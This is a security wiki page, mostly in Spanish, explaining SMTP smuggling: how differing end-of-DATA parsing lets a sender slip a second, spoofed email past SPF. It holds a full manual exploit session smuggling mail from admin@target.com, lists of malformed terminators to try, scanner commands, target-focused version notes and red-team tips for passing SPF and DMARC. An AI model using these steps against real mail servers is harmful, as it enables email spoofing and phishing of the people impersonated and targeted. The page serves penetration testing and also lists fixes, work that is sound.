# SMTP Smuggling

{{#include ../../banners/hacktricks-training.md}}

## Información básica

This type of vulnerability was [**originally discovered in this post**](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/) were it's explained that It's possible to **exploit discrepancies in how the SMTP protocol is interpreted** when finalising an email, allowing an attacker to smuggle more emails in the body of the legit one, allowing to impersonate other users of the affected domain (such as admin@outlook.com) bypassing defenses such as SPF.

### Por qué

Esto ocurre porque en el protocolo SMTP los **datos del mensaje** que se van a enviar en el correo son controlados por un usuario (atacante) que podría enviar datos especialmente creados aprovechando diferencias en los parseadores que colarán correos adicionales en el receptor. Mira este ejemplo ilustrado del post original:

<figure><img src="../../images/image (8) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png">https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png</a></p></figcaption></figure>

### Cómo

Para explotar esta vulnerabilidad, un atacante necesita enviar datos que el **servidor Outbound SMTP piense que son solo 1 correo pero el servidor Inbound SMTP piense que son varios correos**.

Los investigadores descubrieron que diferentes servidores Inbound consideran diferentes caracteres como el final de los datos del mensaje que los servidores Outbound no.\
Por ejemplo, un final de datos habitual es `\r\n.\r`. Pero si el servidor Inbound SMTP también acepta `\n.`, un atacante podría simplemente añadir **ese dato en su correo y empezar a indicar los comandos SMTP** de uno o más nuevos mensajes para colarlos, tal como en la imagen anterior.

Por supuesto, esto solo funcionaría si el **servidor Outbound SMTP no trata también ese dato** como el final de los datos del mensaje, porque en ese caso vería 2 correos en lugar de 1, así que al final es la desincronización la que se está aprovechando en esta vulnerabilidad.

Datos potenciales de desincronización:

- `\n.`
- `\n.\r`

También hay que notar que se bypassa SPF porque si cuelas un correo de `admin@outlook.com` desde un correo de `user@outlook.com`, **el remitente sigue siendo `outlook.com`.**

---

## Lista de comprobación del atacante (¿qué condiciones deben cumplirse?)

Para colar con éxito un segundo correo, normalmente necesitas:

- Un servidor outbound A por el que puedas enviar (a menudo con credenciales válidas) que reenvíe una secuencia de fin‑de‑DATA no estándar sin modificarla. Muchos servicios históricamente reenviaron variantes como `\n.\r\n` o `\n.\n`.
- Un servidor receptor B que interprete esa secuencia no estándar como fin‑de‑DATA y luego analice lo que sigue como nuevos comandos SMTP (MAIL/RCPT/DATA...).
- Outbound debe realmente enviar con `DATA` (no `BDAT`). Si A soporta CHUNKING/BDAT, el smuggling solo funciona si cae a DATA (por ejemplo, B no anuncia CHUNKING); de lo contrario BDAT con framing por longitud evita la ambigüedad.
- PIPELINING no es obligatorio pero ayuda a ocultar los comandos inyectados en una única escritura TCP para que dispositivos intermedios no resincronicen.

Variantes comunes de fin‑de‑DATA que merece la pena probar (dependen del receptor):

- `\n.\n`
- `\n.\r\n`
- `\r.\r\n`
- `\r\n.\r` (CR suelto al final)

Nota: Lo que funciona es la intersección de “lo que A reenvía” ∩ “lo que B acepta”.

---

## Ejemplo de explotación manual (sesión única)

Lo siguiente muestra la idea usando una sesión SMTP STARTTLS en bruto. Tras el primer bloque DATA insertamos un terminador no estándar, luego otro diálogo SMTP que el servidor receptor puede tratar como un nuevo mensaje.

<details>
<summary>Manual smuggling session (STARTTLS)</summary>
```
$ openssl s_client -starttls smtp -crlf -connect smtp.example.com:587
EHLO a.example
AUTH PLAIN <base64(\0user@example.com\0password)>
MAIL FROM:<user@example.com>
RCPT TO:<victim@target.com>
DATA
From: User <user@example.com>
To: victim <victim@target.com>
Subject: legit

hello A
\n.\r\nMAIL FROM:<admin@target.com>
RCPT TO:<victim@target.com>
DATA
From: Admin <admin@target.com>
To: victim <victim@target.com>
Subject: smuggled

hello B
\r\n.\r\n
```
If A forwards `\n.\r\n` and B accepts it as end‑of‑DATA, message “hello B” may be accepted as a second email from `admin@target.com` while passing SPF (aligned with A’s IPs).
</details>

Tip: When testing interactively, ensure `-crlf` is used so OpenSSL preserves CRLF in what you type.

---

## Automatización y escáneres

- hannob/smtpsmug: envía un mensaje que termina con múltiples secuencias end‑of‑DATA malformadas para ver qué acepta un receptor.
- Ejemplo: `./smtpsmug -s mail.target.com -p 25 -t victim@target.com`
- The‑Login/SMTP‑Smuggling‑Tools: scanner tanto para el lado entrante como el saliente, además de un servidor SMTP de análisis para ver exactamente qué secuencias sobreviven a un remitente.
- Comprobación rápida entrante: `python3 smtp_smuggling_scanner.py victim@target.com`
- Saliente a través de un relay: `python3 smtp_smuggling_scanner.py YOUR@ANALYSIS.DOMAIN --outbound-smtp-server smtp.relay.com --port 587 --starttls --sender-address you@relay.com --username you@relay.com --password '...'
`

Estas herramientas te ayudan a mapear los pares A→B donde el smuggling realmente funciona.

---

## CHUNKING/BDAT vs DATA

- DATA usa un terminador centinela `<CR><LF>.<CR><LF>`; cualquier ambigüedad en cómo se normalizan CR/LF o en el dot‑stuffing provoca desincronización.
- CHUNKING (BDAT) enmarca el cuerpo con una longitud exacta en bytes y por tanto previene el smuggling clásico. Sin embargo, si el remitente recurre a DATA (porque el receptor no anuncia CHUNKING), el smuggling clásico vuelve a ser posible.

---

## Notas sobre software afectado y correcciones (para focalizar objetivos)

- Postfix: antes de la 3.9 el valor por defecto toleraba LFs sin CR; a partir de 3.5.23/3.6.13/3.7.9/3.8.4 los admins pueden habilitar `smtpd_forbid_bare_newline`. La recomendación actual es `smtpd_forbid_bare_newline = normalize` (3.8.5+/3.7.10+/3.6.14+/3.5.24+) o ponerlo en `reject` para una aplicación estricta del RFC.
- Exim: corregido en 4.97.1 (y posteriores) para variantes que dependían de secuencias end‑of‑DATA mixtas cuando se usa DATA. Versiones antiguas 4.97/4.96 pueden ser explotables dependiendo de PIPELINING/CHUNKING.
- Sendmail: corregido en 8.18; las versiones antiguas 8.17.x aceptaban algunos terminadores no estándar.
- Varias librerías/servidores (p. ej., aiosmtpd antes de 1.4.5, algunos gateways de vendors, y relays SaaS específicos) tuvieron problemas similares; las versiones modernas tienden a aceptar DATA solo con el estricto `<CR><LF>.<CR><LF>`.

Usa los escáneres anteriores para verificar el comportamiento actual; muchos proveedores cambiaron los valores por defecto a principios de 2024–2025.

---

## Consejos para operaciones de red team

- Prefiere senders grandes y commodity para A (históricamente Exchange Online, hosters compartidos, etc.). Si aún reenvían algún EOM no estándar y están en el SPF de la víctima, tu MAIL FROM smuggled heredará su reputación.
- Enumera las extensiones SMTP de B: banner `EHLO` para PIPELINING/CHUNKING; si falta CHUNKING tienes más posibilidades desde remitentes BDAT‑first. Combínalo con EOMs malformados para sondear la aceptación.
- Observa las cabeceras: el mensaje smuggled normalmente creará una cadena Received separada empezando en B. DMARC a menudo pasará porque MAIL FROM se alinea con el espacio de IPs de A.

---

## **Referencias**

- [https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [https://www.postfix.org/smtp-smuggling.html](https://www.postfix.org/smtp-smuggling.html)

{{#include ../../banners/hacktricks-training.md}}
